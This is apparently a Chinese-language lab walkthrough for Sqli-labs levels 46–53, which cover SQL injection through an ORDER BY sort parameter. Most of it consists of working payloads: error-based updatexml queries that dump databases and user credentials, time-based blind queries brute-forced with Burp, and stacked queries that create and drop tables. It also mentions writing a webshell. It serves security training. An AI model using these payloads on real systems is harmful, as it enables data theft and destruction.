
# Sqli-labs-Less-46
![](https://img-blog.csdnimg.cn/20200727102704950.png#crop=0&crop=0&crop=1&crop=1&id=tis3B&originHeight=81&originWidth=1072&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
打开Sqli-labs-Less-46关后可以看到提示，显示要我们使用SORT进行注入<br />![](https://img-blog.csdnimg.cn/2020072710283554.png#crop=0&crop=0&crop=1&crop=1&id=zOGPP&originHeight=35&originWidth=410&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**输入http://www.web.com/sql/Less-46/?sort=1**<br />发现返回结果是账户和名称，是以ID值来排序的<br />![](https://img-blog.csdnimg.cn/20200727103415341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=JdaUC&originHeight=460&originWidth=304&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**输入http://www.web.com/sql/Less-46/?sort=2**<br />返回结果是以username来排序的<br />![](https://img-blog.csdnimg.cn/20200727103707871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=HgOOj&originHeight=470&originWidth=306&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**输入http://www.web.com/sql/Less-46/?sort=3**<br />返回结果是以password来排序的<br />![](https://img-blog.csdnimg.cn/20200727104207807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=Wdg2l&originHeight=472&originWidth=311&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**总结：sort后面的参数是用来改变根据那一列来进行排列顺序。**

**在参数后面加上desc，发现进行反向排序**<br />http://www.web.com/sql/Less-46/?sort=3 desc<br />![](https://img-blog.csdnimg.cn/20200727104611805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=zhJEW&originHeight=467&originWidth=346&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断注入点**<br />http://www.web.com/sql/Less-46/?sort=3'<br />报错，显示多了一个'说明在此处是没有进行包裹的<br />![](https://img-blog.csdnimg.cn/2020072710514082.png#crop=0&crop=0&crop=1&crop=1&id=SdLWl&originHeight=57&originWidth=1142&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看当前库**<br />http://www.web.com/sql/Less-46/?sort=3 union select 1,2,database()--+<br />报错，说明在此处不能使用union注入<br />![](https://img-blog.csdnimg.cn/20200727105245178.png#crop=0&crop=0&crop=1&crop=1&id=SgJRX&originHeight=105&originWidth=369&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**尝试使用报错注入**<br />http://www.web.com/sql/Less-46/?sort=3 and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+<br />成功<br />![](https://img-blog.csdnimg.cn/20200727105356274.png#crop=0&crop=0&crop=1&crop=1&id=CkuYC&originHeight=81&originWidth=270&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有库**<br />http://www.web.com/sql/Less-46/?sort=3 and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1)--+<br />![](https://img-blog.csdnimg.cn/20200727105456733.png#crop=0&crop=0&crop=1&crop=1&id=V7kav&originHeight=74&originWidth=457&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有表**<br />http://www.web.com/sql/Less-46/?sort=3 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1)--+<br />![](https://img-blog.csdnimg.cn/20200727105552387.png#crop=0&crop=0&crop=1&crop=1&id=judCi&originHeight=101&originWidth=428&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有字段**<br />http://www.web.com/sql/Less-46/?sort=3 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1)--+<br />![](https://img-blog.csdnimg.cn/20200727105706701.png#crop=0&crop=0&crop=1&crop=1&id=NpU2R&originHeight=90&originWidth=431&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有账户和密码**<br />http://www.web.com/sql/Less-46/?sort=3 and updatexml(1,concat(0x7e,(select group_concat(concat_ws('~',username,password)) from security.users),0x7e),1)--+<br />![](https://img-blog.csdnimg.cn/20200727105915676.png#crop=0&crop=0&crop=1&crop=1&id=HWyn8&originHeight=83&originWidth=485&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**使用时间注入**<br />**判断当前数据库名称长度**<br />http://www.web.com/sql/Less-46/?sort=3 and if(length(database())=8,1,sleep(2))--+<br />当等于8时没有时间延时，说明数据库名称长度为8

**判断当前数据库名称**<br />http://www.web.com/sql/Less-46/?sort=3 and if(substr((select database()),1,1)='s',1,sleep(2))--+<br />当等于s时没有时间延时，说明首字母为s

**使用burp爆破出当前库名称**<br />![](https://img-blog.csdnimg.cn/20200727111318521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=gmZVx&originHeight=313&originWidth=829&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断表名**<br />http://www.web.com/sql/Less-46/?sort=3 and if(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e',1,sleep(2))--+<br />使用burp爆破<br />![](https://img-blog.csdnimg.cn/20200727111911631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=notWN&originHeight=298&originWidth=846&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断字段**<br />http://www.web.com/sql/Less-46/?sort=3 and if(substr((select column_name from information_schema.columns where table_name=‘users’ limit 0,1),1,1)=‘u’,1,sleep(5))–+<br />使用burp爆破<br />![](https://img-blog.csdnimg.cn/20200727112021656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=FlEZT&originHeight=307&originWidth=855&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断账户（username）**<br />http://www.web.com/sql/Less-46/?sort=3 and if(substr((select username from security.users limit 0,1),1,1)=‘d’,1,sleep(5))–+<br />使用burp爆破<br />![](https://img-blog.csdnimg.cn/20200727112121908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=xF88I&originHeight=252&originWidth=827&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断密码（password）**<br />http://www.web.com/sql/Less-46/?sort=3 and if(substr((select password from security.users limit 0,1),1,1)=‘d’,1,sleep(5))–+<br />使用burp爆破<br />![](https://img-blog.csdnimg.cn/20200727112212838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=XcclN&originHeight=252&originWidth=827&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**将username，password一起进行爆破**<br />http://www.web.com/sql/Less-46/?sort=3 and if(substr((select group_concat(username,password) from security.users limit 0,1),1,1)=‘d’,1,sleep(5))–+<br />![](https://img-blog.csdnimg.cn/20200727112238428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=KgBky&originHeight=281&originWidth=837&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**使用concat_ws()函数将username，password进行分割并一起进行爆破**<br />http://www.web.com/sql/Less-46/?sort=3 and if(substr((select group_concat(concat_ws(’-’,username,password)) from security.users limit 0,1),1,1)=‘d’,1,sleep(1))–+<br />![](https://img-blog.csdnimg.cn/20200727112253700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=HVFx2&originHeight=330&originWidth=845&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**以此类推可以得到所有数据。**


# Sqli-labs-Less-47
![](https://img-blog.csdnimg.cn/20200727112640253.png#crop=0&crop=0&crop=1&crop=1&id=zKnvi&originHeight=96&originWidth=1081&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**Sqli-labs-Less-47与Sqli-labs-Less-46关一样也需要使用sort进行注入**<br />![](https://img-blog.csdnimg.cn/20200727112722525.png#crop=0&crop=0&crop=1&crop=1&id=Vad11&originHeight=33&originWidth=405&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断注入点**<br />http://www.web.com/sql/Less-47/?sort=1'<br />![](https://img-blog.csdnimg.cn/20200727113207771.png#crop=0&crop=0&crop=1&crop=1&id=wkBhn&originHeight=70&originWidth=1172&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**报错显示我们多了一个'将其注释**<br />http://www.web.com/sql/Less-47/?sort=1'--+<br />成功<br />![](https://img-blog.csdnimg.cn/20200727113241974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=iv7HB&originHeight=395&originWidth=367&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看当前库**<br />http://www.web.com/sql/Less-47/?sort=1' union select 1,2,database()--+<br />报错<br />![](https://img-blog.csdnimg.cn/20200727113320240.png#crop=0&crop=0&crop=1&crop=1&id=spWsZ&originHeight=83&originWidth=350&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**尝试使用报错注入**<br />http://www.web.com/sql/Less-47/?sort=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+<br />成功<br />![](https://img-blog.csdnimg.cn/20200727113440472.png#crop=0&crop=0&crop=1&crop=1&id=CCdiB&originHeight=74&originWidth=289&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**以下步骤与Sqli-labs-Less-46相同，不同的是对参数的处理**<br />**详细见Sqli-labs-Less-46**


# Sqli-labs-Less-48
![](https://img-blog.csdnimg.cn/20200727113837216.png#crop=0&crop=0&crop=1&crop=1&id=RkQDC&originHeight=89&originWidth=1053&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**Sqli-labs-Less-48关与Sqli-labs-Less-46关一样，需要使用sort进行注入**

**判断注入点**<br />http://www.web.com/sql/Less-48/?sort=1'<br />没有错误回显<br />![](https://img-blog.csdnimg.cn/20200727114214265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=Rel2Q&originHeight=220&originWidth=350&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**在这一关，不需要使用?sort=1'因为没有进行包裹直接使用?sort=1即可**

**因为没有错误回显，所以只能使用时间盲注**<br />**以下步骤与Sqli-labs-Less-46中时间盲注部分相同，不进行详细叙述**


# Sqli-labs-Less-49
![](https://img-blog.csdnimg.cn/20200727114641704.png#crop=0&crop=0&crop=1&crop=1&id=EM8uN&originHeight=99&originWidth=1068&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**Sqli-labs-Less-49关与Sqli-labs-Less-46关一样，需要使用sort进行注入**

**判断注入点**<br />http://www.web.com/sql/Less-49/?sort=1'<br />报错，进行注释<br />![](https://img-blog.csdnimg.cn/20200727114809924.png#crop=0&crop=0&crop=1&crop=1&id=nRKu7&originHeight=176&originWidth=322&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

http://www.web.com/sql/Less-49/?sort=1'--+<br />成功<br />![](https://img-blog.csdnimg.cn/20200727114746101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=HfilL&originHeight=370&originWidth=301&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
说明存在注入点<br />**通过上面的报错可以得知，并没有错误回显，因此只能使用时间盲注**

**以下步骤与Sqli-labs-Less-46中的时间盲注相似，不同的是对参数的处理不同**




# Sqli-labs-Less-50
![](https://img-blog.csdnimg.cn/20200727145944864.png#crop=0&crop=0&crop=1&crop=1&id=BdDiG&originHeight=88&originWidth=1075&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**这个貌似和前面的都是相同的，但是我们通过源码观察可知:<br />在本关中使用了mysgli multi guery()函数<br />而在less46-49关中使用了mysqL fetch_assoc()函数<br />所以这里的不同点就在于本关可以使用堆叠注入的形式，我们可以使用以下几种方法:**

1. 基于时间盲注
2. 基于报错往入
3. 写一句话木马(这里不进行演示)
4. 使用堆叠注入创建删除一个表
5. 使用对叠注入写一句话木马(这里不进行演示)


## 方法一 时间盲注
**判断注入点**<br />http://www.web.com/sql/Less-50/?sort=1'<br />报错并显示我们多了一个'说明此处不需要进行包裹<br />![](https://img-blog.csdnimg.cn/20200727150430646.png#crop=0&crop=0&crop=1&crop=1&id=Lc5h4&originHeight=58&originWidth=1121&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断当前库名称长度**<br />http://www.web.com/sql/Less-50/?sort=1 and if(length(database())=8,1,sleep(2))--+<br />当等于8时没有时间延时，说明数据库名称长度为8

**判断当前数据库名称**<br />http://www.web.com/sql/Less-50/?sort=1 and if(substr((select database()),1,1)=‘s’,1,sleep(2))–+<br />当等于s时没有时间延时，说明首字母为s<br />使用burp爆破出当前库名称<br />![](https://img-blog.csdnimg.cn/20200727152755459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=g47v9&originHeight=313&originWidth=829&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断表名**<br />http://www.web.com/sql/Less-50/?sort=1 and if(substr((select table_name from information_schema.tables where table_schema=‘security’ limit 0,1),1,1)=‘e’,1,sleep(2))–+<br />使用burp爆破<br />![](https://img-blog.csdnimg.cn/20200727152804683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=ffCrJ&originHeight=298&originWidth=846&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断字段**<br />http://www.web.com/sql/Less-50/?sort=1 and if(substr((select column_name from information_schema.columns where table_name=‘users’ limit 0,1),1,1)=‘u’,1,sleep(5))–+<br />使用burp爆破<br />![](https://img-blog.csdnimg.cn/20200727152811737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=HYcU6&originHeight=307&originWidth=855&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断账户（username）**<br />http://www.web.com/sql/Less-50/?sort=1 and if(substr((select username from security.users limit 0,1),1,1)=‘d’,1,sleep(5))–+<br />使用burp爆破<br />![](https://img-blog.csdnimg.cn/20200727152821981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=PynXw&originHeight=252&originWidth=827&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断密码（password）**<br />http://www.web.com/sql/Less-50/?sort=1 and if(substr((select password from security.users limit 0,1),1,1)=‘d’,1,sleep(5))–+<br />使用burp爆破<br />![](https://img-blog.csdnimg.cn/20200727152835737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=XK18K&originHeight=252&originWidth=827&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**将username，password一起进行爆破**<br />http://www.web.com/sql/Less-50/?sort=1 and if(substr((select group_concat(username,password) from security.users limit 0,1),1,1)=‘d’,1,sleep(5))–+<br />![](https://img-blog.csdnimg.cn/20200727152846506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=bcAOe&originHeight=281&originWidth=837&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**使用concat_ws()函数将username，password进行分割并一起进行爆破**<br />http://www.web.com/sql/Less-50/?sort=1 and if(substr((select group_concat(concat_ws(’-’,username,password)) from security.users limit 0,1),1,1)=‘d’,1,sleep(1))–+<br />![](https://img-blog.csdnimg.cn/20200727152853892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=EqcTU&originHeight=330&originWidth=845&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 方法二 报错注入
**查看当前数据库**<br />http://www.web.com/sql/Less-50/?sort=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+<br />![](https://img-blog.csdnimg.cn/20200727151111269.png#crop=0&crop=0&crop=1&crop=1&id=QMx9b&originHeight=106&originWidth=372&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有库**<br />http://www.web.com/sql/Less-50/?sort=1 and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1)--+<br />![](https://img-blog.csdnimg.cn/20200727153314203.png#crop=0&crop=0&crop=1&crop=1&id=Y0FAt&originHeight=84&originWidth=492&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有表**<br />http://www.web.com/sql/Less-50/?sort=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1)--+<br />![](https://img-blog.csdnimg.cn/20200727153453454.png#crop=0&crop=0&crop=1&crop=1&id=ntDtB&originHeight=57&originWidth=475&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有字段**<br />http://www.web.com/sql/Less-50/?sort=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1)--+<br />![](https://img-blog.csdnimg.cn/20200727153544801.png#crop=0&crop=0&crop=1&crop=1&id=vnrxZ&originHeight=74&originWidth=449&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有账户和密码**<br />http://www.web.com/sql/Less-50/?sort=1 and updatexml(1,concat(0x7e,(select group_concat(concat_ws('~',username,password)) from security.users),0x7e),1)--+<br />![](https://img-blog.csdnimg.cn/20200727153800220.png#crop=0&crop=0&crop=1&crop=1&id=wkX2R&originHeight=111&originWidth=566&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)



## 方法三 堆叠注入
**创建表**<br />http://www.web.com/sql/Less-50/?sort=1; create table sqli50 like users;--+<br />在数据库中查看否成功创建<br />![](https://img-blog.csdnimg.cn/20200727151341447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=FZOkW&originHeight=255&originWidth=333&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**删除表**<br />http://www.web.com/sql/Less-50/?sort=1; drop table sqli50;--+

在数据库中查看是否成功删除<br />![](https://img-blog.csdnimg.cn/20200727151705658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=ZUjub&originHeight=244&originWidth=304&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


# Sqli-labs-Less-51
![](https://img-blog.csdnimg.cn/20200727151909825.png#crop=0&crop=0&crop=1&crop=1&id=UoZsl&originHeight=102&originWidth=1129&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查找注入点**<br />http://www.web.com/sql/Less-51/?sort=1'<br />报错，并显示我们多了一个'<br />![](https://img-blog.csdnimg.cn/2020072715394066.png#crop=0&crop=0&crop=1&crop=1&id=BTD23&originHeight=58&originWidth=1155&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**进行注释**<br />http://www.web.com/sql/Less-51/?sort=1'--+<br />成功，说明存在注入点<br />![](https://img-blog.csdnimg.cn/20200727154035820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=TzU6V&originHeight=225&originWidth=313&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

## 方法一 时间盲注
**判断当前数据库长度**<br />http://www.web.com/sql/Less-51/?sort=1' and if(length(database())=8,1,sleep(2))--+<br />以下步骤与Sqli-labs-Less-50中的时间盲注相同，不同的是对参数的处理

## 方法二 报错注入
**查看当前库**<br />http://www.web.com/sql/Less-51/?sort=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+<br />![](https://img-blog.csdnimg.cn/20200727154455878.png#crop=0&crop=0&crop=1&crop=1&id=r7yVq&originHeight=98&originWidth=311&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
以下步骤与Sqli-labs-Less-50中的报错注入相同，不同的是对参数的处理

## 方法三 堆叠注入
堆叠注入步骤与Sqli-labs-Less-50中的堆叠注入相同，不同的是对参数的处理


# Sqli-labs-Less-52
![](https://img-blog.csdnimg.cn/20200727154640235.png#crop=0&crop=0&crop=1&crop=1&id=ejZle&originHeight=90&originWidth=1136&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

## 方法一 时间盲注
判断注入点<br />http://www.web.com/sql/Less-52/?sort=1'--+<br />报错，并且没有报错回显（不能使用报错注入），去掉'<br />http://www.web.com/sql/Less-52/?sort=1--+<br />成功<br />![](https://img-blog.csdnimg.cn/2020072715512196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=jOnui&originHeight=369&originWidth=375&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
以下步骤与Sqli-labs-Less-50中的时间盲注相同，不进行详细叙述

## 方法二堆叠注入
堆叠注入步骤与Sqli-labs-Less-50中的堆叠注入相同，不进行详细叙述


# Sqli-labs-Less-53
![](https://img-blog.csdnimg.cn/2020072715555752.png#crop=0&crop=0&crop=1&crop=1&id=bg1JK&originHeight=96&originWidth=1145&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

## 方法一 时间盲注
**判断注入点**<br />http://www.web.com/sql/Less-53/?sort=1'<br />报错，并且没有报错回显（**不能使用报错注入**），加上注释<br />http://www.web.com/sql/Less-53/?sort=1'--+<br />成功说明存在注入<br />![](https://img-blog.csdnimg.cn/20200727155914997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=dsW8L&originHeight=226&originWidth=323&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**以下步骤与Sqli-labs-Less-50中的时间盲注相同，不同的是对参数的处理不同，不进行详细叙述**

## 方法二堆叠注入
**堆叠注入步骤与Sqli-labs-Less-50中的堆叠注入相同，不同的是对参数的处理不同，不进行详细叙述**


